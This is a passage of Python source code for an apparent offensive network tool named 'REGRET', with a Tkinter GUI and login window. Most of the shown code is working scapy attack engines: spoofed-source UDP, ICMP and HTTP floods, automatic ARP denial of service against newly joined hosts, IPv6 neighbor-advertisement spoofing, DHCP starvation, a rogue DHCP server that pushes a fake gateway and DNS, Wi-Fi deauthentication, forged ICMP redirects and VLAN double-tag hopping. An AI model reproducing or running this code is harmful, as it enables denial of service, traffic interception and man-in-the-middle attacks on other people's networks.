                base = IP(src=src, dst=tip) if src else IP(dst=tip)
                send(base / UDP(sport=random.randint(1024, 65535),
                                dport=tport) / pay, verbose=0)
                self._counter[0] += 1
            except Exception:
                pass

    def _icmp_worker(self, tip, spoof, size):
        from scapy.all import IP, ICMP, Raw, send
        pay = Raw(b'I' * max(0, size - 28))
        while not self._stop_evt.is_set():
            try:
                src = (f'{random.randint(1,254)}.{random.randint(0,255)}.'
                       f'{random.randint(0,255)}.{random.randint(1,254)}'
                       ) if spoof else None
                base = IP(src=src, dst=tip) if src else IP(dst=tip)
                send(base / ICMP() / pay, verbose=0)
                self._counter[0] += 1
            except Exception:
                pass

    def _http_worker(self, tip, tport):
        import socket as _s
        req = (f'GET / HTTP/1.1\r\nHost: {tip}\r\n'
               'User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n').encode()
        while not self._stop_evt.is_set():
            try:
                s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
                s.settimeout(2)
                s.connect((tip, tport))
                s.sendall(req)
                self._counter[0] += 1
                s.close()
            except Exception:
                pass

    def _scapy_stats_loop(self):
        prev = 0
        while self._active and not self._stop_evt.is_set():
            time.sleep(1)
            cur     = self._counter[0]
            pps     = cur - prev
            prev    = cur
            elapsed = time.time() - self._start_ts
            self.stats_cb(cur, pps, elapsed, 'scapy')

    # ── Stop ──────────────────────────────────────────────────────────────────

    def stop(self):
        self._active = False
        self._stop_evt.set()
        if self._proc:
            try:
                import signal as _sig
                os.killpg(os.getpgid(self._proc.pid), _sig.SIGINT)
            except Exception:
                try:
                    self._proc.terminate()
                except Exception:
                    pass
            self._proc = None
        self._threads.clear()


# ── Auto-Attack Engine ────────────────────────────────────────────────────────

class AutoAttackEngine:
    """
    Periodically scans all configured subnets and launches a GARP B-attack
    on any host that was not present when the engine started.
    """

    def __init__(self, iface, subnets, whitelist_ips, log_cb, interval=60, mitm=False):
        self.iface         = iface
        self.subnets       = list(subnets)
        self._whitelist    = whitelist_ips
        self.log           = log_cb
        self.interval      = interval
        self.mitm          = mitm
        self._known        = set()
        self._attack_tgts  = []
        self._stop         = threading.Event()
        self._thread       = None
        self._active       = False
        self._atk          = None

    def start(self, known_ips=None):
        if self._active:
            return
        self._known       = set(known_ips or [])
        self._attack_tgts = []
        self._atk         = AttackEngine(self.iface, self.log)
        if not self._atk.init_gateway():
            self.log('[-] Auto-Attack: could not resolve gateway', 'error')
            return
        set_ip_forward(self.mitm)
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log(
            f'[+] Auto-Attack started — interval={self.interval}s  '
            f'{"MITM" if self.mitm else "DoS"}  '
            f'{len(self._known)} known host(s) seeded', 'success')

    def _loop(self):
        while not self._stop.is_set():
            self._stop.wait(self.interval)
            if self._stop.is_set():
                break
            self._tick()

    def _tick(self):
        self.log('[*] Auto-Attack: scanning for new hosts ...', 'info')
        new_hosts = []
        seen      = set()
        for net in self.subnets:
            try:
                for d in arp_scan(net, self.iface):
                    ip = d['ip']
                    if ip in seen:
                        continue
                    seen.add(ip)
                    if ip not in self._known and ip not in self._whitelist:
                        new_hosts.append(d)
            except Exception as e:
                self.log(f'[-] Auto-Attack scan error ({net}): {e}', 'error')

        self._known.update(seen)

        if new_hosts:
            self.log(
                f'[!] Auto-Attack: {len(new_hosts)} new host(s) detected — B-attack launching',
                'warn')
            for h in new_hosts:
                self.log(f'    -> {h["ip"]}  {h["mac"]}', 'warn')
                self._attack_tgts.append(h)
            self._atk.stop_garp()
            self._atk.start_garp(list(self._attack_tgts), mitm=self.mitm, interval=0.5)
        else:
            self.log('[*] Auto-Attack: no new hosts', 'info')

    def stop(self):
        self._active = False
        self._stop.set()
        if self._atk:
            self._atk.stop_all()
        set_ip_forward(False)
        self.log('[*] Auto-Attack stopped', 'warn')


# ── Lockout Engine ─────────────────────────────────────────────────────────────

class LockoutEngine:
    """
    Records which hosts exist when activated ('allowed' set).
    Periodically scans and immediately ARP-DoS-es any host outside that set,
    preventing new devices from reaching the internet.
    """

    def __init__(self, iface, subnets, whitelist_ips, log_cb, interval=15):
        self.iface      = iface
        self.subnets    = list(subnets)
        self._whitelist = whitelist_ips
        self.log        = log_cb
        self.interval   = interval
        self._allowed   = set()
        self._blocked   = set()
        self._stop      = threading.Event()
        self._thread    = None
        self._active    = False
        self._atk       = None

    def start(self, allowed_hosts=None):
        if self._active:
            return
        self._allowed = set(allowed_hosts or [])
        self._blocked = set()
        self._atk     = AttackEngine(self.iface, self.log)
        if not self._atk.init_gateway():
            self.log('[-] Lockout: could not resolve gateway', 'error')
            return
        set_ip_forward(False)
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log(
            f'[+] Lockout enabled — {len(self._allowed)} existing host(s) allowed; '
            f'new joiners blocked every {self.interval}s', 'success')

    def _loop(self):
        while not self._stop.is_set():
            self._stop.wait(self.interval)
            if self._stop.is_set():
                break
            self._tick()

    def _tick(self):
        self.log('[*] Lockout: scanning for new joiners ...', 'info')
        for net in self.subnets:
            try:
                for d in arp_scan(net, self.iface):
                    ip = d['ip']
                    if ip in self._whitelist or ip in self._allowed:
                        continue
                    if ip not in self._blocked:
                        self._blocked.add(ip)
                        self.log(
                            f'[!] LOCKOUT: blocking new host {ip}  ({d["mac"]})', 'warn')
                    self._atk.start_host(ip, rate_kbps=None)
            except Exception as e:
                self.log(f'[-] Lockout scan error ({net}): {e}', 'error')

    def stop(self):
        self._active = False
        self._stop.set()
        if self._atk:
            self._atk.stop_all()
        set_ip_forward(False)
        self.log('[*] Lockout disabled — ARP restored for blocked hosts', 'warn')


# ── NDP / IPv6 Spoof Engine ──────────────────────────────────────────────────

class NDPSpoofEngine:
    """Forges ICMPv6 Neighbor Advertisements — IPv6 ARP-spoofing, bypasses DAI entirely."""

    def __init__(self, iface, log_cb):
        self.iface   = iface
        self.log     = log_cb
        self._hosts  = []
        self._gw_ip6 = None
        self._my_mac = None
        self._stop   = threading.Event()
        self._thread = None
        self._active = False

    def start(self, hosts, gw_ip6):
        if self._active or not IPV6_OK:
            if not IPV6_OK:
                self.log('[-] IPv6 scapy modules not available', 'error')
            return
        self._hosts  = hosts
        self._gw_ip6 = gw_ip6
        self._my_mac = get_if_hwaddr(self.iface)
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log(f'[+] NDP Spoof started on {len(hosts)} host(s)', 'success')

    def _loop(self):
        while not self._stop.is_set():
            for h in self._hosts:
                try:
                    pkt = (Ether(src=self._my_mac, dst=h['mac']) /
                           IPv6(dst=h['ip6']) /
                           ICMPv6ND_NA(tgt=self._gw_ip6, R=0, S=1, O=1) /
                           ICMPv6NDOptDstLLAddr(lladdr=self._my_mac))
                    sendp(pkt, iface=self.iface, verbose=0)
                except Exception:
                    pass
            self._stop.wait(2.0 + random.uniform(-0.2, 0.2))

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] NDP Spoof stopped', 'warn')


# ── Passive Discovery Engine ──────────────────────────────────────────────────

class PassiveDiscoveryEngine:
    """Zero-packet recon: listens for ARP, DHCP, mDNS, SSDP without sending a single frame."""

    def __init__(self, iface, log_cb, host_cb):
        self.iface   = iface
        self.log     = log_cb
        self.host_cb = host_cb   # fn(ip, mac, source)
        self._seen   = set()
        self._stop   = threading.Event()
        self._thread = None
        self._active = False

    def start(self):
        if self._active:
            return
        self._seen.clear()
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log('[+] Passive Discovery started — listening silently', 'success')

    def _loop(self):
        bpf = 'arp or (udp and (port 67 or port 68 or port 5353 or port 1900))'
        try:
            scapy_sniff(iface=self.iface, filter=bpf, prn=self._handle,
                        stop_filter=lambda _: self._stop.is_set(), store=False)
        except Exception as e:
            self.log(f'[-] Passive sniff error: {e}', 'error')

    def _handle(self, pkt):
        ip = mac = src = None
        if pkt.haslayer(ARP):
            ip, mac, src = pkt[ARP].psrc, pkt[ARP].hwsrc, 'ARP'
        elif pkt.haslayer(IP) and pkt.haslayer(UDP):
            dp  = pkt[UDP].dport
            sp  = pkt[UDP].sport
            ip  = pkt[IP].src
            mac = pkt[Ether].src if pkt.haslayer(Ether) else ''
            if dp in (67, 68) or sp in (67, 68): src = 'DHCP'
            elif dp == 5353:                      src = 'mDNS'
            elif dp == 1900:                      src = 'SSDP'
        if not ip or not src or ip in ('0.0.0.0', '255.255.255.255'):
            return
        if ip in self._seen:
            return
        self._seen.add(ip)
        self.log(f'[+] Passive: {ip}  {mac or "?"}  [{src}]', 'success')
        self.host_cb(ip, mac or '', src)

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] Passive Discovery stopped', 'warn')


# ── DHCP Starvation Engine ────────────────────────────────────────────────────

class DHCPStarvationEngine:
    """Floods DHCP server with random-MAC DISCOVERs, exhausting the IP address pool."""

    def __init__(self, iface, log_cb, stats_cb):
        self.iface     = iface
        self.log       = log_cb
        self.stats_cb  = stats_cb   # fn(total, pps)
        self._stop     = threading.Event()
        self._threads  = []
        self._counter  = [0]
        self._active   = False
        self._start_ts = 0.0

    def start(self, num_threads=4):
        if self._active or not DHCP_OK:
            if not DHCP_OK:
                self.log('[-] scapy BOOTP/DHCP not available', 'error')
            return
        self._stop.clear()
        self._active     = True
        self._start_ts   = time.time()
        self._counter[0] = 0
        for _ in range(num_threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            self._threads.append(t)
        threading.Thread(target=self._stats_loop, daemon=True).start()
        self.log(f'[+] DHCP Starvation — {num_threads} thread(s)', 'success')

    def _worker(self):
        while not self._stop.is_set():
            try:
                mac_str = generate_random_mac()
                mac_raw = bytes.fromhex(mac_str.replace(':', ''))
                xid     = random.randint(0, 0xFFFFFFFF)
                pkt = (Ether(src=mac_str, dst='ff:ff:ff:ff:ff:ff') /
                       IP(src='0.0.0.0', dst='255.255.255.255') /
                       UDP(sport=68, dport=67) /
                       BOOTP(chaddr=mac_raw + b'\x00' * 10, xid=xid) /
                       DHCP(options=[('message-type', 'discover'), 'end']))
                sendp(pkt, iface=self.iface, verbose=0)
                self._counter[0] += 1
            except Exception:
                pass

    def _stats_loop(self):
        prev = 0
        while self._active and not self._stop.is_set():
            time.sleep(1)
            cur = self._counter[0]
            self.stats_cb(cur, cur - prev)
            prev = cur

    def stop(self):
        self._active = False
        self._stop.set()
        self._threads.clear()
        self.log('[*] DHCP Starvation stopped', 'warn')


# ── Rogue DHCP Engine ─────────────────────────────────────────────────────────

class RogueDHCPEngine:
    """Responds to DHCP requests faster than the real server, injecting a fake gateway and DNS."""

    def __init__(self, iface, log_cb, our_ip, fake_gw, fake_dns,
                 subnet='255.255.255.0', lease=86400):
        self.iface    = iface
        self.log      = log_cb
        self.our_ip   = our_ip
        self.fake_gw  = fake_gw
        self.fake_dns = fake_dns
        self.subnet   = subnet
        self.lease    = lease
        self._base    = '.'.join(our_ip.split('.')[:3])
        self._idx     = 100
        self._leases  = {}
        self._stop    = threading.Event()
        self._thread  = None
        self._active  = False

    def _next_ip(self):
        ip = f'{self._base}.{self._idx}'
        self._idx = (self._idx % 200) + 100
        return ip

    def start(self):
        if self._active or not DHCP_OK:
            if not DHCP_OK:
                self.log('[-] scapy BOOTP/DHCP not available', 'error')
            return
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log(f'[+] Rogue DHCP — GW={self.fake_gw}  DNS={self.fake_dns}', 'success')

    def _loop(self):
        try:
            scapy_sniff(iface=self.iface,
                        filter='udp and (port 67 or port 68)',
                        prn=self._handle,
                        stop_filter=lambda _: self._stop.is_set(),
                        store=False)
        except Exception as e:
            self.log(f'[-] Rogue DHCP error: {e}', 'error')

    def _handle(self, pkt):
        if not pkt.haslayer(DHCP):
            return
        opts  = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
        mtype = opts.get('message-type', 0)
        mac   = pkt[Ether].src if pkt.haslayer(Ether) else ''
        if mtype == 1:
            offered = self._leases.get(mac) or self._next_ip()
            self._leases[mac] = offered
            self._send_reply(pkt, offered, 2)
            self.log(f'[+] DHCP OFFER → {mac}  ({offered})', 'success')
        elif mtype == 3:
            offered = self._leases.get(mac) or self._next_ip()
            self._leases[mac] = offered
            self._send_reply(pkt, offered, 5)
            self.log(f'[+] DHCP ACK  → {mac}  ({offered})  GW={self.fake_gw}', 'success')

    def _send_reply(self, pkt, offered_ip, mtype):
        try:
            client_mac = pkt[Ether].src
            mac_raw    = bytes.fromhex(client_mac.replace(':', ''))
            reply = (Ether(src=get_if_hwaddr(self.iface), dst='ff:ff:ff:ff:ff:ff') /
                     IP(src=self.our_ip, dst='255.255.255.255') /
                     UDP(sport=67, dport=68) /
                     BOOTP(op=2, yiaddr=offered_ip, siaddr=self.our_ip,
                           chaddr=mac_raw + b'\x00' * 10, xid=pkt[BOOTP].xid) /
                     DHCP(options=[
                         ('message-type', mtype),
                         ('subnet_mask',  self.subnet),
                         ('router',       self.fake_gw),
                         ('name_server',  self.fake_dns),
                         ('lease_time',   self.lease),
                         ('server_id',    self.our_ip),
                         'end'
                     ]))
            sendp(reply, iface=self.iface, verbose=0)
        except Exception as e:
            self.log(f'[-] DHCP reply error: {e}', 'error')

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] Rogue DHCP stopped', 'warn')


# ── Wi-Fi Deauth Engine ───────────────────────────────────────────────────────

class WiFiDeauthEngine:
    """802.11 Deauth frames force clients off their AP. Monitor-mode interface required."""

    def __init__(self, iface, log_cb):
        self.iface    = iface
        self.log      = log_cb
        self._targets = []
        self._stop    = threading.Event()
        self._thread  = None
        self._active  = False
        self.frames_sent = 0

    def start(self, targets, burst=5, interval=0.5):
        if self._active or not DOT11_OK:
            if not DOT11_OK:
                self.log('[-] scapy Dot11 not available — install scapy[complete]', 'error')
            return
        self._targets    = targets
        self.frames_sent = 0
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(
            target=self._loop, args=(burst, interval), daemon=True)
        self._thread.start()
        self.log(f'[+] Deauth — {len(targets)} target(s)  burst={burst}', 'success')

    def _loop(self, burst, interval):
        while not self._stop.is_set():
            for t in self._targets:
                try:
                    pkt1 = (RadioTap() /
                            Dot11(addr1=t['client'], addr2=t['bssid'], addr3=t['bssid']) /
                            Dot11Deauth(reason=7))
                    pkt2 = (RadioTap() /
                            Dot11(addr1=t['bssid'], addr2=t['client'], addr3=t['bssid']) /
                            Dot11Deauth(reason=7))
                    sendp([pkt1, pkt2], iface=self.iface,
                          count=burst, inter=0.01, verbose=0)
                    self.frames_sent += burst * 2
                except Exception as e:
                    self.log(f'[-] Deauth error: {e}', 'error')
            self._stop.wait(interval + random.uniform(-0.05, 0.05))

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] Deauth stopped', 'warn')


# ── ICMP Redirect Engine ──────────────────────────────────────────────────────

class ICMPRedirectEngine:
    """Forged ICMP Type-5 Redirect from gateway IP reroutes victims without ARP — bypasses DAI."""

    def __init__(self, iface, log_cb):
        self.iface    = iface
        self.log      = log_cb
        self._gw_ip   = None
        self._our_ip  = None
        self._targets = []
        self._dest    = '0.0.0.0'
        self._stop    = threading.Event()
        self._thread  = None
        self._active  = False

    def start(self, targets, our_ip, dest_net='0.0.0.0'):
        if self._active:
            return
        self._gw_ip   = get_gateway_ip()
        self._our_ip  = our_ip
        self._targets = targets
        self._dest    = dest_net
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log(
            f'[+] ICMP Redirect — spoof_src={self._gw_ip}  new_gw={self._our_ip}', 'success')

    def _loop(self):
        while not self._stop.is_set():
            for ip in self._targets:
                try:
                    from scapy.all import send as _send
                    pkt = (IP(src=self._gw_ip, dst=ip) /
                           ICMP(type=5, code=1, gw=self._our_ip) /
                           IP(src=ip, dst=self._dest))
                    _send(pkt, iface=self.iface, verbose=0)
                except Exception as e:
                    self.log(f'[-] ICMP Redirect error ({ip}): {e}', 'error')
            self._stop.wait(3.0 + random.uniform(-0.3, 0.3))

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] ICMP Redirect stopped', 'warn')


# ── VLAN Hop Engine ───────────────────────────────────────────────────────────

class VLANHopEngine:
    """802.1Q double-tagging: outer tag stripped by switch, inner tag reaches target VLAN."""

    def __init__(self, iface, log_cb):
        self.iface   = iface
        self.log     = log_cb
        self._stop   = threading.Event()
        self._thread = None
        self._active = False

    def start(self, target_ip, target_mac, outer_vlan, inner_vlan):
        if self._active or not DOT1Q_OK:
            if not DOT1Q_OK:
                self.log('[-] scapy Dot1Q not available', 'error')
            return
        self._stop.clear()
        self._active = True
        self._thread = threading.Thread(
            target=self._loop,
            args=(target_ip, target_mac, outer_vlan, inner_vlan),
            daemon=True)
        self._thread.start()
        self.log(
            f'[+] VLAN Hop — outer={outer_vlan} inner={inner_vlan} target={target_ip}',
            'success')

    def _loop(self, target_ip, target_mac, outer_vlan, inner_vlan):
        while not self._stop.is_set():
            try:
                pkt = (Ether(dst=target_mac) /
                       Dot1Q(vlan=outer_vlan) /
                       Dot1Q(vlan=inner_vlan) /
                       ARP(op=1, pdst=target_ip))
                sendp(pkt, iface=self.iface, verbose=0)
            except Exception as e:
                self.log(f'[-] VLAN hop error: {e}', 'error')
            self._stop.wait(2.0 + random.uniform(-0.2, 0.2))

    def stop(self):
        self._active = False
        self._stop.set()
        self.log('[*] VLAN Hop stopped', 'warn')


# ── Login window ──────────────────────────────────────────────────────────────

class LoginWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('REGRET — Login')
        self.geometry('420x380')
        self.resizable(False, False)
        self.configure(bg=BG)
        self.protocol('WM_DELETE_WINDOW', self._cancel)
        self.authenticated = False
        self._attempts = 0
        self._build_style()
        self._build_ui()

    def _build_style(self):
        s = ttk.Style(self)
        s.theme_use('clam')
        s.configure('.', background=BG, foreground=TEXT, bordercolor=BORDER,
                    troughcolor=BG2, focuscolor=ACCENT)
        s.configure('TEntry', fieldbackground=BG3, foreground=TEXT,
                    bordercolor=BORDER, insertcolor=TEXT, selectbackground=ACCENT,
                    font=('Consolas', 10), padding=6)
        s.configure('Login.TButton', background=ACCENT, foreground='white',
                    font=('Consolas', 11, 'bold'), borderwidth=0, padding=[0, 10])
        s.map('Login.TButton',
              background=[('active', ACCENT_H), ('pressed', ACCENT_H)])

    def _build_ui(self):
        # Header
        hdr = tk.Frame(self, bg=BG2, height=110)
        hdr.pack(fill='x')
        hdr.pack_propagate(False)
        tk.Label(hdr, text='☠', font=('Segoe UI Emoji', 34),
                 bg=BG2, fg=ACCENT).pack(pady=(12, 0))
        tk.Label(hdr, text='REGRET', font=('Consolas', 20, 'bold'),
                 bg=BG2, fg=ACCENT).pack()
        sub = tk.Frame(hdr, bg=BG2)
        sub.pack()
        tk.Label(sub, text='Network Control Tool  |  by ',
                 font=('Consolas', 7), bg=BG2, fg=TEXT_DIM).pack(side='left')
        tk.Label(sub, text='Syed Sadam Hussain Shah',
                 font=('Consolas', 7, 'bold'), bg=BG2, fg=ACCENT).pack(side='left')

        tk.Frame(self, bg=ACCENT, height=2).pack(fill='x')

        # Form
        form = tk.Frame(self, bg=BG, padx=40)
        form.pack(fill='x', pady=20)

        tk.Label(form, text='USERNAME', font=('Consolas', 8, 'bold'),
                 bg=BG, fg=TEXT_DIM).pack(anchor='w', pady=(0, 2))
        self._user = ttk.Entry(form)
        self._user.pack(fill='x', ipady=4)

        tk.Label(form, text='PASSWORD', font=('Consolas', 8, 'bold'),
                 bg=BG, fg=TEXT_DIM).pack(anchor='w', pady=(12, 2))
        self._passwd = ttk.Entry(form, show='●')
        self._passwd.pack(fill='x', ipady=4)

        self._err = tk.Label(form, text='', font=('Consolas', 8),
                              bg=BG, fg=ACCENT)
        self._err.pack(pady=(8, 0))

        ttk.Button(form, text='LOGIN', style='Login.TButton',
                   command=self._login).pack(fill='x', pady=(8, 0))

        self._user.focus_set()
        self._user.bind('<Return>',  lambda e: self._passwd.focus_set())
        self._passwd.bind('<Return>', lambda e: self._login())

    def _login(self):
        user = self._user.get()
        pw   = self._passwd.get()
        if _check_credentials(user, pw):
            self.authenticated = True
            self.destroy()
        else:
            self._attempts += 1
            self._err.configure(
                text=f'Invalid credentials  (attempt {self._attempts})')
            self._passwd.delete(0, 'end')
            self._passwd.focus_set()
            if self._attempts >= 5:
                self._err.configure(text='Too many failed attempts. Exiting.')
                self.after(1500, self.destroy)

    def _cancel(self):
        self.authenticated = False
        self.destroy()


# ── GUI ───────────────────────────────────────────────────────────────────────

class RegretApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('REGRET — Network Control Tool')
        self.geometry('1100x720')
        self.minsize(900, 620)
        self.configure(bg=BG)
        self.protocol('WM_DELETE_WINDOW', self._on_close)

        self._iface    = tk.StringVar()
        self._hosts    = []       # list of host dicts
        self._subnets  = []       # list of subnet strings
        self._engine   = None
        self._running  = False
        self._enrich_pending  = 0
        self._original_mac    = {}   # iface -> original MAC before any change
        self._mac_changed     = False
        self._sslstrip_engine = None
        self._stress_engine   = None
        self._dns_engine      = None
        self._sniffer_engine  = None
        self._autoatk_engine  = None
        self._lockout_engine  = None
        self._ndp_engine      = None
        self._passive_engine  = None
        self._dhcp_starv_eng  = None
        self._rogue_dhcp_eng  = None
        self._deauth_engine   = None
        self._redirect_engine = None
        self._vlan_engine     = None
        self._whitelist_ips   = self._load_whitelist()

        self._build_style()
        self._build_header()
        self._build_tabs()
        self._build_statusbar()
        self._init_iface()
        self.log('[*] Regret v1.0 ready — configure subnets, then click SCAN', 'info')

    # ── Style ─────────────────────────────────────────────────────────────────

    def _build_style(self):
        s = ttk.Style(self)
        s.theme_use('clam')
        s.configure('.', background=BG, foreground=TEXT, bordercolor=BORDER,
                    troughcolor=BG2, focuscolor=ACCENT)
        s.configure('TNotebook', background=BG2, borderwidth=0, tabmargins=[0, 0, 0, 0])
        s.configure('TNotebook.Tab', background=BG2, foreground=TEXT_DIM,
                    padding=[10, 8], font=('Consolas', 9, 'bold'), borderwidth=0)
        s.map('TNotebook.Tab',
              background=[('selected', BG3), ('active', BG3)],
              foreground=[('selected', ACCENT), ('active', TEXT)])
        s.configure('TFrame', background=BG)
        s.configure('TLabel', background=BG, foreground=TEXT)
        s.configure('TEntry', fieldbackground=BG3, foreground=TEXT,
                    bordercolor=BORDER, insertcolor=TEXT, selectbackground=ACCENT)
        s.configure('TCombobox', fieldbackground=BG3, background=BG3,
                    foreground=TEXT, selectbackground=ACCENT, bordercolor=BORDER)
        s.configure('Accent.TButton', background=ACCENT, foreground='white',
                    font=('Consolas', 10, 'bold'), borderwidth=0, padding=[14, 7])
        s.map('Accent.TButton',
              background=[('active', ACCENT_H), ('pressed', ACCENT_H), ('disabled', BG3)])
        s.configure('Ghost.TButton', background=BG3, foreground=TEXT,
                    font=('Consolas', 9), borderwidth=1, padding=[10, 6], bordercolor=BORDER)
        s.map('Ghost.TButton',
              background=[('active', BORDER), ('pressed', BORDER), ('disabled', BG2)],
              foreground=[('disabled', TEXT_DIM)])
        s.configure('Treeview', background=BG2, fieldbackground=BG2,
                    foreground=TEXT, rowheight=28, borderwidth=0, font=('Consolas', 9))
        s.configure('Treeview.Heading', background=BG3, foreground=ACCENT,
                    font=('Consolas', 9, 'bold'), borderwidth=0, relief='flat')
        s.map('Treeview',
              background=[('selected', BG3)],
              foreground=[('selected', CYAN)])
        s.configure('TRadiobutton', background=BG3, foreground=TEXT,
                    font=('Consolas', 9), focuscolor=BG3)
        s.configure('TCheckbutton', background=BG3, foreground=TEXT,
                    font=('Consolas', 9), focuscolor=BG3)
        s.configure('TScale', background=BG3, troughcolor=BORDER,
                    sliderlength=16, sliderrelief='flat')
        s.configure('Vertical.TScrollbar', background=BG3, troughcolor=BG2,
                    bordercolor=BG, arrowcolor=TEXT_DIM)
        s.configure('Horizontal.TScrollbar', background=BG3, troughcolor=BG2,
                    bordercolor=BG, arrowcolor=TEXT_DIM)

    # ── Header ────────────────────────────────────────────────────────────────

    def _build_header(self):
        hdr = tk.Frame(self, bg=BG2, height=72)
        hdr.pack(fill='x', side='top')
        hdr.pack_propagate(False)

        left = tk.Frame(hdr, bg=BG2)
        left.pack(side='left', padx=18, pady=10)
        tk.Label(left, text='☠', font=('Segoe UI Emoji', 30),
                 bg=BG2, fg=ACCENT).pack(side='left', padx=(0, 12))
        info = tk.Frame(left, bg=BG2)
        info.pack(side='left')
        tk.Label(info, text='REGRET', font=('Consolas', 24, 'bold'),
                 bg=BG2, fg=ACCENT).pack(anchor='w')
        sub = tk.Frame(info, bg=BG2)
        sub.pack(anchor='w')
        tk.Label(sub, text='Network Control Tool  v2.0  |  by ',
                 font=('Consolas', 8), bg=BG2, fg=TEXT_DIM).pack(side='left')
        tk.Label(sub, text='Syed Sadam Hussain Shah',
                 font=('Consolas', 8, 'bold'), bg=BG2, fg=ACCENT).pack(side='left')

        right = tk.Frame(hdr, bg=BG2)
        right.pack(side='right', padx=18)
        tk.Label(right, text='INTERFACE', font=('Consolas', 7, 'bold'),
                 bg=BG2, fg=TEXT_DIM).pack(anchor='w')
        row = tk.Frame(right, bg=BG2)
        row.pack()
        self._iface_cb = ttk.Combobox(row, textvariable=self._iface,
                                       width=13, state='readonly',
                                       font=('Consolas', 9))
        self._iface_cb.pack(side='left', padx=(0, 8))
        self._scan_btn = ttk.Button(row, text='▶  SCAN', style='Accent.TButton',
                                     command=self._do_scan)
        self._scan_btn.pack(side='left')

        tk.Frame(self, bg=ACCENT, height=2).pack(fill='x')

    # ── Tabs ──────────────────────────────────────────────────────────────────

    def _build_tabs(self):
        self._nb = ttk.Notebook(self)
        self._nb.pack(fill='both', expand=True)

        self._tab_scanner   = ttk.Frame(self._nb)
        self._tab_whitelist = ttk.Frame(self._nb)
        self._tab_attack    = ttk.Frame(self._nb)
        self._tab_autoatk   = ttk.Frame(self._nb)
        self._tab_lockout   = ttk.Frame(self._nb)
        self._tab_ipv6      = ttk.Frame(self._nb)
        self._tab_passive   = ttk.Frame(self._nb)
        self._tab_dhcp      = ttk.Frame(self._nb)
        self._tab_deauth    = ttk.Frame(self._nb)
        self._tab_redirect  = ttk.Frame(self._nb)
        self._tab_session   = ttk.Frame(self._nb)
        self._tab_vlan      = ttk.Frame(self._nb)
        self._tab_dns       = ttk.Frame(self._nb)
        self._tab_sniffer   = ttk.Frame(self._nb)
        self._tab_mac       = ttk.Frame(self._nb)
        self._tab_hostname  = ttk.Frame(self._nb)
        self._tab_pwreset   = ttk.Frame(self._nb)
        self._tab_sslstrip  = ttk.Frame(self._nb)
        self._tab_stress    = ttk.Frame(self._nb)
        self._tab_log       = ttk.Frame(self._nb)

        self._nb.add(self._tab_scanner,   text=' ◈ SCAN ')
        self._nb.add(self._tab_whitelist, text=' ◻ WHITELIST ')
        self._nb.add(self._tab_attack,    text=' ⚡ ATTACK ')
        self._nb.add(self._tab_autoatk,   text=' ⟳ AUTO-ATK ')
        self._nb.add(self._tab_lockout,   text=' ⛔ LOCKOUT ')
        self._nb.add(self._tab_ipv6,      text=' ⬡ IPv6 ')
        self._nb.add(self._tab_passive,   text=' ◉ PASSIVE ')
        self._nb.add(self._tab_dhcp,      text=' ⬢ DHCP ')
        self._nb.add(self._tab_deauth,    text=' 📡 DEAUTH ')
        self._nb.add(self._tab_redirect,  text=' ↩ REDIRECT ')
        self._nb.add(self._tab_session,   text=' 💾 SESSION ')
        self._nb.add(self._tab_vlan,      text=' 🔗 VLAN ')
        self._nb.add(self._tab_dns,       text=' ⬡ DNS SPOOF ')
        self._nb.add(self._tab_sniffer,   text=' ◎ SNIFFER ')
        self._nb.add(self._tab_mac,       text=' ◎ MAC ')
        self._nb.add(self._tab_hostname,  text=' ⬡ HOSTNAME ')
        self._nb.add(self._tab_pwreset,   text=' 🔑 PASSWD ')
        self._nb.add(self._tab_sslstrip,  text=' ◉ HSTS ')
        self._nb.add(self._tab_stress,    text=' ☄ STRESS ')
        self._nb.add(self._tab_log,       text=' ▤ LOG ')

        self._build_scanner_tab()
        self._build_whitelist_tab()
        self._build_attack_tab()
        self._build_autoatk_tab()
        self._build_lockout_tab()
        self._build_ipv6_tab()
        self._build_passive_tab()
        self._build_dhcp_tab()
        self._build_deauth_tab()
        self._build_redirect_tab()
        self._build_session_tab()
        self._build_vlan_tab()
        self._build_dns_tab()
        self._build_sniffer_tab()
        self._build_mac_tab()
        self._build_hostname_tab()
        self._build_pwreset_tab()
        self._build_sslstrip_tab()
        self._build_stress_tab()
        self._build_log_tab()

    # ── Scanner tab ───────────────────────────────────────────────────────────

    def _build_scanner_tab(self):
        f = self._tab_scanner

        desc = tk.Frame(f, bg='#0e1420', pady=5)
        desc.pack(fill='x')
        tk.Label(desc,
                 text='  ARP sweep — broadcasts who-has requests to map all live hosts on selected subnets.\n'
                      '  Run this first. Select targets here and push them to the Attack tab.',
                 font=('Consolas', 8), bg='#0e1420', fg='#5a7a9a',
                 justify='left').pack(anchor='w', padx=6)

        # ── Subnet panel (top) ────────────────────────────────────────────────
        subnet_outer = tk.Frame(f, bg=BG3)
        subnet_outer.pack(fill='x', padx=10, pady=(10, 4))

        tk.Label(subnet_outer, text='  SUBNETS TO SCAN',
                 font=('Consolas', 9, 'bold'), bg=BG3, fg=ACCENT,
                 pady=6).pack(anchor='w')

        subnet_body = tk.Frame(subnet_outer, bg=BG3)
        subnet_body.pack(fill='x', padx=8, pady=(0, 8))

        # Listbox of current subnets
        lb_frame = tk.Frame(subnet_body, bg=BG3)
        lb_frame.pack(side='left', fill='y')
        self._subnet_lb = tk.Listbox(
